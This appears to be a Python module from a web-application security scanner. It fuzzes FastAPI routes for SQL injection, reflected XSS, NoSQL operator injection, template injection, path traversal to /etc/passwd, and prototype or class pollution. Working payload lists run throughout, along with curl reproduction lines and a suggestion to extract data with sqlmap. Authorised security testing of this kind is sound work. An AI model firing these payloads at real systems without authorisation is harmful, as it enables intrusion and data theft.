"""A03 — Injection (SQLi / XSS / operator injection).

Fully route-map driven, so it works on any FastAPI target:
  1. SQL injection: every GET route that declares query params is fuzzed one
     param at a time with classic SQLi payloads, compared against a benign
     baseline. A SQL error signature in the body is a strong signal; a payload
     that turns a 200 baseline into a 500 is a weaker "possible" signal.
  2. Reflected XSS: JSON-body write routes get a unique ``<script>`` marker in
     each string field; if the raw marker comes back un-encoded the app echoes
     attacker HTML without output encoding (verify at the render sink).
  3. Operator injection (light): login/filter-ish JSON routes get a Mongo-style
     ``{"$ne": null}`` where a string is expected, to spot NoSQL operator
     injection or auth bypass.
"""

from __future__ import annotations

from ..core.context import Context
from ..core.reqbuild import build_request, string_body_fields
from ..core.taxonomy import REFS
from ..discovery.openapi import body_field_names
from .base import body_says_error, module

# Classic SQLi probes. Each is sent one query-param at a time; the pg_sleep one
# is harmless (0-second sleep) but still exercises stacked-query parsing.
_SQLI_PROBES = ["'", "' OR '1'='1", "1;SELECT pg_sleep(0)--", "%27", "\" OR \"1\"=\"1"]
# A value that should never itself trigger a server error — the baseline.
_BENIGN = "heimdallbaseline1"

# Boolean-differential SQLi pairs: each (TRUE, FALSE) differs only in the final
# digit (1 vs 2), so a reflecting endpoint returns near-identical bodies while a
# genuine injection diverges (TRUE matches all rows, FALSE none). This catches
# data-returning injections that leak no SQL error and no 500 — notably SQLite
# (which has no sleep primitive, so the time-based module can't confirm) and apps
# that mask errors behind a generic 500/200. Covers double/single-quote and
# numeric contexts.
_SQLI_BOOL_PAIRS = [
    ('heim" OR "1"="1', 'heim" OR "1"="2'),
    ("heim' OR '1'='1", "heim' OR '1'='2"),
    ("heim' OR 1=1-- -", "heim' OR 1=2-- -"),
    ("1 OR 1=1", "1 OR 1=2"),
]
# Response bodies differing by more than one reflected char (or a status change)
# are attributable to the boolean condition, not to reflection length.
_SQLI_BOOL_MIN_DELTA = 48


def _materially_differ(a, b) -> bool:
    """True when two responses diverge beyond a one-char payload reflection —
    the signal that a boolean SQL condition changed the result set."""
    if a.status_code != b.status_code:
        return True
    return abs(len(a.text or "") - len(b.text or "")) > _SQLI_BOOL_MIN_DELTA
# Routes that legitimately reflect user input (search/echo) or are noisy to
# fuzz; still fuzzed, but this keeps caps meaningful.
_SQLI_ROUTE_CAP = 40
_SQLI_PARAM_CAP = 3
_XSS_ROUTE_CAP = 25
# NoSQL operator-injection hint: routes that look like auth or filtering.
_OPINJ_HINT = ("login", "token", "auth", "signin", "search", "filter", "query", "find")
# Candidate filter keys for a schemaless body whose fields aren't documented.
_NOSQL_KEYS = ("username", "email", "user", "name", "id", "login", "q", "query", "search")


@module("a03", "Injection (SQLi / XSS / SSTI / traversal)")
def run(ctx: Context) -> None:
    _sqli_sweep(ctx)
    _xss_probe(ctx)
    _operator_injection(ctx)
    _ssti_probe(ctx)
    _path_traversal_probe(ctx)
    _prototype_pollution(ctx)


def _actor_token(ctx: Context) -> str | None:
    """Prefer a low-privilege attacker token, else any authed principal."""
    p = ctx.principal("attacker", "user")
    if p and p.authed:
        return p.token
    any_p = ctx.profile.any_authed()
    return any_p.token if any_p else None


def _sqli_sweep(ctx: Context) -> None:
    """Fuzz query params of GET routes with SQLi payloads vs. a baseline."""
    token = _actor_token(ctx)
    targets = [r for r in ctx.routes.by_method("GET") if r.query_params][:_SQLI_ROUTE_CAP]
    if not targets:
        ctx.note("no GET routes with query params; SQLi sweep skipped")
        return

    error_hits = []   # strong: SQL error signature leaked
    err500_hits = []  # weak: payload caused a 500 the baseline did not
    bool_hits = []    # strong: boolean-differential (data-returning) injection
    tested = 0
    for r in targets:
        for param in r.query_params[:_SQLI_PARAM_CAP]:
            pname = param.get("name")
            if not pname:
                continue
            # Baseline first so we can tell "always 500" from "500 on injection".
            try:
                base = ctx.get(r.fill_path({}), token=token, params={pname: _BENIGN})
            except Exception as exc:  # requests may raise on connection issues
                ctx.note(f"baseline request failed for GET {r.path}?{pname}: {exc}")
                continue
            base_500 = base.status_code >= 500
            tested += 1
            flagged = False
            for probe in _SQLI_PROBES:
                try:
                    resp = ctx.get(r.fill_path({}), token=token, params={pname: probe})
                except Exception as exc:
                    ctx.note(f"probe failed for GET {r.path}?{pname}: {exc}")
                    continue
                if body_says_error(resp.text):
                    error_hits.append((r, pname, probe, resp))
                    flagged = True
                    break  # one strong signal per param is enough
                if resp.status_code >= 500 and not base_500:
                    err500_hits.append((r, pname, probe, resp))
                    flagged = True
                    break
            if flagged:
                continue
            # Boolean-differential: TRUE vs FALSE payloads that differ by one char.
            for t_pay, f_pay in _SQLI_BOOL_PAIRS:
                try:
                    rt = ctx.get(r.fill_path({}), token=token, params={pname: t_pay})
                    rf = ctx.get(r.fill_path({}), token=token, params={pname: f_pay})
                except Exception as exc:
                    ctx.note(f"boolean probe failed for GET {r.path}?{pname}: {exc}")
                    break
                if _materially_differ(rt, rf):
                    bool_hits.append((r, pname, t_pay, f_pay, rt, rf))
                    break

    if bool_hits:
        sample = "\n".join(
            f"  GET {r.path}?{pname}: TRUE={t!r} -> {rt.status_code}/{len(rt.text)}B  "
            f"FALSE={f!r} -> {rf.status_code}/{len(rf.text)}B"
            for r, pname, t, f, rt, rf in bool_hits[:15]
        )
        r0, p0, t0, f0, _, _ = bool_hits[0]
        ctx.finding(
            id="a03-sqli-boolean",
            owasp="A03", severity="HIGH",
            title=f"Boolean-based SQL injection on {len(bool_hits)} param(s)",
            summary=(
                "Two payloads differing only in their boolean result (…\"1\"=\"1\" vs "
                "…\"1\"=\"2\") produced materially different responses, so the parameter is "
                "evaluated inside a SQL WHERE clause — a confirmed injection that returns data "
                "conditionally. Unlike time-based probes this works on SQLite (no sleep "
                "primitive) and on apps that mask SQL errors. Extract data with sqlmap and "
                "switch to parameterised queries."
            ),
            evidence=sample,
            route=f"GET {r0.path}",
            request=f"GET {r0.fill_path({})}?{p0}={t0}   (vs FALSE {f0!r})",
            reproduction=(
                f"curl -s '{ctx.base_url}{r0.fill_path({})}?{p0}={t0}'  # TRUE: rows\n"
                f"curl -s '{ctx.base_url}{r0.fill_path({})}?{p0}={f0}'  # FALSE: none"
            ),
            references=[REFS["ps-sqli"], REFS["A03"]],
            tools=["sqlmap", "Burp Suite (Intruder)", "curl"],
        )

    if error_hits:
        sample = "\n".join(
            f"  GET {r.path}?{pname}={probe!r} -> {resp.status_code} (SQL error leaked)"
            for r, pname, probe, resp in error_hits[:15]
        )
        r0, p0, pr0, _ = error_hits[0]
        ctx.finding(
            id="a03-sqli-error-based",
            owasp="A03", severity="HIGH",
            title=f"Error-based SQL injection signal on {len(error_hits)} param(s)",
            summary=(
                "Injecting SQL metacharacters into query parameters produced database "
                "error signatures (SQLAlchemy/psycopg/syntax errors) in the response body. "
                "Unsanitised input is reaching the SQL layer — a likely injection point "
                "and, at minimum, verbose error leakage. Confirm with a boolean/time-based "
                "payload before reporting exploitability."
            ),
            evidence=sample,
            route=f"GET {r0.path}",
            request=f"GET {r0.fill_path({})}?{p0}={pr0}",
            reproduction=(
                f"curl -s '{ctx.base_url}{r0.fill_path({})}?{p0}={pr0}'"
                "  # observe SQL error in body"
            ),
            references=[REFS["ps-sqli"], REFS["A03"]],
            tools=["sqlmap", "Burp Suite (Intruder)", "curl"],
        )
    elif err500_hits:
        sample = "\n".join(
            f"  GET {r.path}?{pname}={probe!r} -> {resp.status_code} (baseline was <500)"
            for r, pname, probe, resp in err500_hits[:15]
        )
        r0, p0, pr0, _ = err500_hits[0]
        ctx.finding(
            id="a03-sqli-possible",
            owasp="A03", severity="MEDIUM",
            title=f"Possible SQL injection on {len(err500_hits)} param(s) (500 on payload)",
            summary=(
                "SQL metacharacters in these query parameters produced a 500 that a benign "
                "baseline value did not, suggesting the input reaches an unsanitised query "
                "path. No explicit SQL error signature was leaked, so this is a candidate "
                "rather than a confirmed injection — verify with sqlmap."
            ),
            evidence=sample,
            reproduction=(
                f"curl -s '{ctx.base_url}{r0.fill_path({})}?{p0}={pr0}'"
                "  # 500 vs. benign baseline"
            ),
            references=[REFS["ps-sqli"], REFS["A03"]],
            tools=["sqlmap", "Burp Suite (Intruder)", "curl"],
        )
    elif tested and not bool_hits:
        ctx.finding(
            id="a03-sqli-error-based",
            owasp="A03", severity="SAFE",
            title="No SQL injection signal on fuzzed query params",
            summary=(
                f"Fuzzed {tested} query param(s) across up to {len(targets)} GET route(s) "
                "with classic SQLi payloads; none leaked a SQL error or diverged from the "
                "benign baseline status."
            ),
        )


def _xss_probe(ctx: Context) -> None:
    """Send a unique <script> marker into string body fields; flag raw reflection."""
    if ctx.safe:
        ctx.note("safe mode: skipping mutating XSS reflection probe")
        return
    token = _actor_token(ctx)
    targets = [
        r for r in ctx.routes.by_method("POST", "PUT", "PATCH")
        if body_field_names(r)
    ][:_XSS_ROUTE_CAP]
    if not targets:
        ctx.note("no JSON-body write routes; XSS probe skipped")
        return

    princ = ctx.principal("attacker", "user")
    reflected = []
    for n, r in enumerate(targets):
        payload = f"<script>heimdall{n}</script>"
        # Build a VALID request (typed fields synthesised, FK ids + path resolved)
        # and drop the payload only into string fields, so the request passes
        # validation and the payload actually lands where it may be rendered.
        sfields = string_body_fields(r) or body_field_names(r)
        overrides = {f: payload for f in sfields}
        path, body = build_request(ctx, r, token, principal=princ, overrides=overrides)
        try:
            resp = ctx.request(r.method, path, token=token, json=body)
        except Exception as exc:
            ctx.note(f"XSS probe failed for {r.method} {r.path}: {exc}")
            continue
        # Signal = raw <script> reflected AND the response is served as HTML.
        # A JSON API echoing the value back (the created object) is normal and
        # not XSS, so gating on Content-Type: text/html removes that whole class
        # of false positives; an HTML-encoded (&lt;script&gt;) echo also won't match.
        ctype = resp.headers.get("Content-Type", "").lower()
        if payload in resp.text and "html" in ctype:
            reflected.append((r, payload, resp))

    if reflected:
        sample = "\n".join(
            f"  {r.method} {r.path} -> {resp.status_code} (reflected {payload!r} raw)"
            for r, payload, resp in reflected[:15]
        )
        r0 = reflected[0][0]
        ctx.finding(
            id="a03-xss-reflected",
            owasp="A03", severity="MEDIUM",
            title=f"Un-encoded input reflected on {len(reflected)} write route(s)",
            summary=(
                "A unique <script> payload submitted in the request body was echoed back "
                "verbatim, without HTML-encoding, in the response. The value was persisted "
                "or reflected without server-side output encoding — verify at the render "
                "sink (any HTML page/template that displays this field) to confirm "
                "reflected or stored XSS. JSON API responses are only exploitable if a "
                "browser renders them as HTML."
            ),
            evidence=sample,
            reproduction=(
                f"Submit {r0.method} {r0.path} with a body field set to "
                "'<script>alert(1)</script>' and inspect where the value is rendered."
            ),
            references=[REFS["A03"]],
            tools=["Burp Suite (Intruder)", "XSS Hunter", "curl"],
        )
    else:
        ctx.finding(
            id="a03-xss-reflected",
            owasp="A03", severity="SAFE",
            title="No raw HTML reflection on write routes",
            summary=(
                f"Submitted a <script> marker to {len(targets)} JSON-body write route(s); "
                "none reflected the payload un-encoded in the response body."
            ),
        )


def _operator_injection(ctx: Context) -> None:
    """Light NoSQL/operator-injection probe on auth/filter JSON routes.

    Covers declared-field bodies (swap each field for a ``{"$ne": null}`` operator)
    AND schemaless free-form bodies — e.g. a search route reading ``request.json()``
    directly into a Mongo query, which has no documented fields at all — by probing
    common filter keys and watching for a filter bypass that returns every record."""
    if ctx.safe:
        ctx.note("safe mode: skipping mutating operator-injection probe")
        return
    targets = [
        r for r in ctx.routes.by_method("POST", "PUT", "PATCH")
        if any(h in f"{r.path} {r.operation_id}".lower() for h in _OPINJ_HINT)
    ][:15]
    if not targets:
        ctx.note("no auth/filter JSON routes; operator-injection probe skipped")
        return

    hits = []
    for r in targets:
        fields = body_field_names(r)
        try:
            if not fields:
                found = _freeform_operator(ctx, r)   # schemaless body (request.json())
                if found:
                    hits.append(found)
                continue
            # Baseline: a normal (wrong) string value — establishes the reject status.
            benign = {f: _BENIGN for f in fields}
            # Injection: swap each field for a Mongo-style operator object.
            operator = {f: {"$ne": None} for f in fields}
            base = ctx.request(r.method, r.fill_path({}), json=benign)
            inj = ctx.request(r.method, r.fill_path({}), json=operator)
        except Exception as exc:
            ctx.note(f"operator-injection probe failed for {r.method} {r.path}: {exc}")
            continue
        # Signals: a 500 (operator reached a query engine) or a 200 where the
        # benign value was rejected (auth/filter bypass).
        if inj.status_code >= 500:
            hits.append((r, base, inj, "500 on operator object"))
        elif inj.status_code < 300 and base.status_code in (400, 401, 403, 422):
            hits.append((r, base, inj, "bypass: operator accepted where benign was rejected"))
        elif (inj.status_code < 300 and base.status_code < 300
              and len(inj.text or "") - len(base.text or "") > 64):
            hits.append((r, base, inj, "operator returned materially more data (filter bypass)"))

    if hits:
        sample = "\n".join(
            f"  {r.method} {r.path} -> {inj.status_code} (baseline {base.status_code}; {why})"
            for r, base, inj, why in hits[:15]
        )
        r0 = hits[0][0]
        ctx.finding(
            id="a03-operator-injection",
            owasp="A03", severity="HIGH",
            title=f"Operator injection signal on {len(hits)} route(s)",
            summary=(
                "Submitting a Mongo-style operator object ({\"$ne\": null}) where a string "
                "was expected either errored the backend or was accepted where a benign "
                "value was rejected. This indicates the body is passed into a query/filter "
                "without type validation — NoSQL operator injection or an authentication "
                "bypass. Confirm manually before reporting."
            ),
            evidence=sample,
            reproduction=(
                f"Send {r0.method} {r0.path} with a string field replaced by "
                "'{\"$ne\": null}' and compare against a benign value."
            ),
            references=[REFS["A03"]],
            tools=["Burp Suite (Repeater)", "NoSQLMap", "curl"],
        )
    else:
        ctx.finding(
            id="a03-operator-injection",
            owasp="A03", severity="SAFE",
            title="No operator-injection signal on auth/filter routes",
            summary=(
                f"Sent a {{\"$ne\": null}} operator object to {len(targets)} auth/filter "
                "route(s); none errored or bypassed validation."
            ),
        )


def _freeform_operator(ctx: Context, r):
    """Probe a schemaless JSON-body route (fields not declared — the body is read
    straight into a query) by placing a ``{"$ne": null}`` operator under common
    filter keys and comparing to a benign value. A 500, or a materially larger
    response (the filter matched every record), signals NoSQL operator injection."""
    for key in _NOSQL_KEYS:
        try:
            base = ctx.request(r.method, r.fill_path({}), json={key: _BENIGN})
            inj = ctx.request(r.method, r.fill_path({}), json={key: {"$ne": None}})
        except Exception as exc:  # noqa: BLE001
            ctx.note(f"free-form operator probe {r.method} {r.path} failed: {exc}")
            return None
        if inj.status_code >= 500 and base.status_code < 500:
            return (r, base, inj, f"500 on {{{key!r}: {{$ne: null}}}}")
        if (inj.status_code < 300 and base.status_code < 300
                and len(inj.text or "") - len(base.text or "") > 64):
            return (r, base, inj,
                    f"{{{key!r}: {{$ne: null}}}} returned all records (filter bypass)")
    return None


# ── Server-side template injection (SSTI) ─────────────────────────────────────

# Marker-wrapped so the evaluated product (191*7=1337) can't be a coincidence:
# a hit means the engine computed our expression between the markers.
_SSTI_MARK = "hh"
_SSTI_EXPECT = f"{_SSTI_MARK}1337{_SSTI_MARK}"
_SSTI_PAYLOADS = [
    f"{_SSTI_MARK}{{{{191*7}}}}{_SSTI_MARK}",   # Jinja2/Twig  {{191*7}}
    f"{_SSTI_MARK}${{191*7}}{_SSTI_MARK}",       # Freemarker/JSP EL  ${191*7}
    f"{_SSTI_MARK}#{{191*7}}{_SSTI_MARK}",       # Ruby/Thymeleaf  #{191*7}
    f"{_SSTI_MARK}<%= 191*7 %>{_SSTI_MARK}",     # ERB
    f"{_SSTI_MARK}*{{191*7}}{_SSTI_MARK}",       # Thymeleaf  *{...}
]
_SSTI_ROUTE_CAP = 30


def _ssti_probe(ctx: Context) -> None:
    """Inject template expressions into string inputs; a marker-wrapped evaluated
    product in the response confirms server-side template injection (→ RCE)."""
    token = _actor_token(ctx)
    hits = []
    tested = 0
    # query params on GETs
    for r in ctx.routes.by_method("GET"):
        if not r.query_params:
            continue
        for param in r.query_params[:3]:
            pname = param.get("name")
            if not pname:
                continue
            tested += 1
            if _ssti_hit_query(ctx, r, pname, token):
                hits.append(f"GET {r.path}?{pname}")
                break
        if len(hits) >= 15 or tested > 60:
            break
    # string body fields on writes
    if not ctx.safe:
        for r in ctx.routes.by_method("POST", "PUT", "PATCH")[:_SSTI_ROUTE_CAP]:
            fields = body_field_names(r)
            if not fields:
                continue
            tested += 1
            if _ssti_hit_body(ctx, r, fields, token):
                hits.append(f"{r.method} {r.path}")
    else:
        ctx.note("safe mode: SSTI body-injection skipped (query params still tested)")

    if hits:
        ctx.finding(
            id="a03-ssti", owasp="A03", severity="CRITICAL",
            title=f"Server-side template injection on {len(hits)} input(s)",
            summary=(
                "A template expression injected into user input was EVALUATED by the server "
                f"(our marker-wrapped `191*7` came back as `{_SSTI_EXPECT}`). SSTI typically "
                "escalates to remote code execution. Never render user input as a template; "
                "use logic-less templates / sandboxing and pass data as context variables."
            ),
            evidence="evaluated at:\n  " + "\n  ".join(hits[:15]),
            route=hits[0].split("?")[0].split(" (")[0],
            request=f"{hits[0]}  with payload {{{{191*7}}}} (expect 1337 in response)",
            reproduction="Inject {{191*7}} / ${191*7} into the field and look for 1337.",
            references=[REFS["A03"], "https://portswigger.net/web-security/server-side-template-injection"],
            tools=["tplmap", "Burp", "SSTImap"],
        )
    elif tested:
        ctx.finding(
            id="a03-ssti", owasp="A03", severity="SAFE",
            title="No server-side template injection signal",
            summary=f"Template-expression payloads across {tested} input(s) were not evaluated.",
        )


def _ssti_hit_query(ctx, r, pname, token) -> bool:
    for payload in _SSTI_PAYLOADS:
        try:
            resp = ctx.get(r.fill_path({}), token=token, params={pname: payload})
        except Exception as exc:  # noqa: BLE001
            ctx.note(f"SSTI probe {r.path}?{pname} failed: {exc}")
            return False
        if _SSTI_EXPECT in (resp.text or ""):
            return True
    return False


def _ssti_hit_body(ctx, r, fields, token) -> bool:
    princ = ctx.principal("attacker", "user")
    sfields = string_body_fields(r) or fields
    for payload in _SSTI_PAYLOADS:
        # valid request with the SSTI payload in string fields (path/FK resolved)
        overrides = {f: payload for f in sfields[:8]}
        path, body = build_request(ctx, r, token, principal=princ, overrides=overrides)
        try:
            resp = ctx.request(r.method, path, token=token, json=body)
        except Exception as exc:  # noqa: BLE001
            ctx.note(f"SSTI body probe {r.method} {r.path} failed: {exc}")
            return False
        if _SSTI_EXPECT in (resp.text or ""):
            return True
    return False


# ── Path traversal ────────────────────────────────────────────────────────────

_TRAVERSAL_NAMES = (
    "file", "filename", "filepath", "path", "name", "template", "download",
    "doc", "document", "page", "include", "view", "dir", "folder", "attachment",
    "log", "read", "resource", "asset", "img_path", "load",
)
_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../../../../../etc/hostname",
]
import re as _re  # noqa: E402
_PASSWD_RE = _re.compile(r"root:.*?:0:0:")


def _traversal_name(n: str) -> bool:
    n = (n or "").lower()
    return any(h == n or h in n for h in _TRAVERSAL_NAMES)


def _path_traversal_probe(ctx: Context) -> None:
    """Inject path-traversal sequences into file/path-ish inputs; the contents of
    /etc/passwd (root:...:0:0:) in the response confirms arbitrary file read."""
    token = _actor_token(ctx)
    hits = []
    tested = 0
    for r in ctx.routes.by_method("GET"):
        for param in r.query_params:
            pname = param.get("name")
            if not _traversal_name(pname):
                continue
            tested += 1
            for payload in _TRAVERSAL_PAYLOADS:
                try:
                    resp = ctx.get(r.fill_path({}), token=token, params={pname: payload})
                except Exception as exc:  # noqa: BLE001
                    ctx.note(f"traversal probe {r.path}?{pname} failed: {exc}")
                    break
                if _PASSWD_RE.search(resp.text or ""):
                    hits.append(f"GET {r.path}?{pname}")
                    break
    # path params that look like a filename/path
    for r in ctx.routes.by_method("GET"):
        for pp in r.path_params:
            if not _traversal_name(pp):
                continue
            tested += 1
            for payload in _TRAVERSAL_PAYLOADS:
                enc = payload.replace("/", "%2f")
                try:
                    resp = ctx.get(r.fill_path({pp: enc}), token=token)
                except Exception:  # noqa: BLE001
                    break
                if _PASSWD_RE.search(resp.text or ""):
                    hits.append(f"GET {r.path} [{pp}]")
                    break

    if hits:
        ctx.finding(
            id="a03-path-traversal", owasp="A03", severity="HIGH",
            title=f"Path traversal / arbitrary file read on {len(hits)} input(s)",
            summary=(
                "A `../`-style payload made the server return the contents of /etc/passwd "
                "(matched `root:…:0:0:`). An attacker can read arbitrary files (configs, keys, "
                "source). Resolve user paths against a fixed base and reject `..` / absolute "
                "paths; prefer opaque ids over filenames."
            ),
            evidence="file read at:\n  " + "\n  ".join(hits[:15]),
            route=hits[0].split("?")[0].split(" [")[0],
            request=f"{hits[0]}  with value ../../../../etc/passwd",
            reproduction="Set the file/path parameter to ../../../../etc/passwd (and URL-encoded).",
            references=[REFS["A03"], "https://portswigger.net/web-security/file-path-traversal"],
            tools=["Burp", "ffuf", "dotdotpwn"],
        )
    elif tested:
        ctx.finding(
            id="a03-path-traversal", owasp="A03", severity="SAFE",
            title="No path-traversal file read",
            summary=f"Traversal payloads across {tested} file/path input(s) did not return "
                    "system file contents.",
        )


# ── Object / class pollution ─────────────────────────────────────────────────

# Object/class pollution: an unsafe recursive merge / setattr of attacker JSON
# lets special keys mutate SHARED state, so a property set on one object appears
# on others. Two flavours, both real:
#   * Python  — recursive setattr reaching the class/globals chain
#     (__class__.__init__.__globals__, __class__.__dict__, __defaults__, …),
#   * JS/Node — __proto__ / constructor.prototype polluting Object.prototype.
# We inject the canonical keys with a canary and confirm behaviourally: does the
# canary LEAK into an unrelated response (pollution) or 500 a merge?
_PP_NONCE = "heimdallpp31337"
_PP_PAYLOADS = [
    # Python class pollution (recursive setattr/merge gadgets)
    {"__class__": {"__init__": {"__globals__": {"heimdallPolluted": _PP_NONCE}}}},
    {"__init__": {"__globals__": {"heimdallPolluted": _PP_NONCE}}},
    {"__class__": {"__dict__": {"heimdallPolluted": _PP_NONCE}}},
    {"__class__": {"heimdallPolluted": _PP_NONCE}},
    # JS/Node prototype pollution (when the API merges JSON forwarded downstream)
    {"__proto__": {"heimdallPolluted": _PP_NONCE}},
    {"constructor": {"prototype": {"heimdallPolluted": _PP_NONCE}}},
    {"__proto__": {"status": _PP_NONCE, "role": _PP_NONCE}},
]


def _prototype_pollution(ctx: Context) -> None:
    if ctx.safe:
        ctx.note("safe mode: skipping prototype-pollution probes (mutating)")
        return
    token = _actor_token(ctx)
    princ = ctx.principal("attacker", "user")
    # Any JSON-object body — INCLUDING free-form/dict bodies (no declared fields),
    # which are prime pollution targets precisely because they merge arbitrary keys.
    write_routes = [r for r in ctx.routes.by_method("POST", "PUT", "PATCH")
                    if r.body_schema is not None][:25]
    if not write_routes:
        ctx.note("no JSON-body write routes; object-pollution probe skipped")
        return

    sent, crashed = [], []
    for r in write_routes:
        # Baseline: the SAME synthesised body WITHOUT pollution keys. If it already
        # 500s (e.g. it references objects that don't exist), a 500 on the polluted
        # body proves nothing — only a crash the benign body did NOT cause is signal.
        bpath, bbody = build_request(ctx, r, token, principal=princ)
        try:
            base_500 = ctx.request(r.method, bpath, token=token, json=bbody).status_code >= 500
        except Exception:  # noqa: BLE001
            base_500 = True   # can't establish a baseline -> don't attribute crashes here
        for pp in _PP_PAYLOADS:
            path, body = build_request(ctx, r, token, principal=princ)
            body.update(pp)                       # valid fields + pollution keys
            try:
                resp = ctx.request(r.method, path, token=token, json=body)
            except Exception as exc:  # noqa: BLE001
                ctx.note(f"object-pollution probe {r.method} {r.path} failed: {exc}")
                continue
            sent.append((r, path, body, pp))
            if resp.status_code >= 500 and not base_500:
                crashed.append((r, path, pp))

    # Two-step: did the injected canary LEAK into an unrelated response? That is
    # the confirmation of real server-side pollution (a fresh object gained our
    # property via the polluted prototype / shared merge target).
    leaked = None
    for gr in [r for r in ctx.routes.by_method("GET") if not r.has_path_param][:12]:
        try:
            resp = ctx.get(gr.path, token=token)
        except Exception:  # noqa: BLE001
            continue
        if _PP_NONCE in (resp.text or ""):
            leaked = (gr, resp)
            break

    if leaked:
        gr, _ = leaked
        r0, p0, b0, pp0 = sent[0]
        ctx.finding(
            id="a03-object-pollution", owasp="A03", severity="HIGH",
            title="Object/class pollution — injected property leaked into another response",
            summary=(
                "A special-key payload (Python `__class__` / `__init__` / `__globals__`, or JS "
                "`__proto__` / `constructor.prototype`) was merged server-side and our canary "
                f"later appeared in the unrelated response of `GET {gr.path}` — the injected "
                "property leaked onto other objects / shared state. This is object/class "
                "pollution: an unsafe recursive merge or `setattr` lets an attacker flip auth "
                "flags, defaults, or config globally (in Python by reaching the class/globals "
                "chain; in Node by polluting Object.prototype). Reject `__class__` / `__proto__`"
                " / `constructor` / dunder keys and never recursively merge/setattr raw input."
            ),
            evidence=f"polluted via {r0.method} {p0} with {pp0}\n"
                     f"canary '{_PP_NONCE}' then observed in GET {gr.path}",
            route=f"{r0.method} {r0.path}",
            request=f"{r0.method} {p0}\nContent-Type: application/json\n\n{b0}",
            references=[REFS["A03"], "https://blog.abdulrah33m.com/prototype-pollution-in-python/",
                        "https://portswigger.net/web-security/prototype-pollution"],
            tools=["Burp (server-side pollution scanner)", "ppmap"],
        )
    elif crashed:
        r0, p0, pp0 = crashed[0]
        ctx.finding(
            id="a03-object-pollution", owasp="A03", severity="MEDIUM",
            title=f"Server error on object/class-pollution payload ({len(crashed)} route(s))",
            summary=(
                "A `__class__` / `__globals__` / `__proto__` payload caused a 500 where a valid "
                "body did not — the server tried to recursively merge or `setattr` "
                "attacker-controlled special keys. Confirm whether this is object/class "
                "pollution or a plain crash; either way, reject dunder/special keys before any "
                "merge or attribute assignment."
            ),
            evidence=f"{r0.method} {p0} returned 500 on payload {pp0}",
            route=f"{r0.method} {r0.path}",
            request=f"{r0.method} {p0}  (body includes {pp0})",
            references=[REFS["A03"], "https://blog.abdulrah33m.com/prototype-pollution-in-python/"],
            tools=["Burp", "ppmap"],
        )
    elif sent:
        ctx.finding(
            id="a03-object-pollution", owasp="A03", severity="SAFE",
            title="No object/class pollution observed",
            summary=f"Injected Python (__class__/__globals__) and JS (__proto__/constructor) "
                    f"pollution payloads into {len(write_routes)} write route(s); the canary "
                    "never leaked into another response and no merge crashed.",
        )
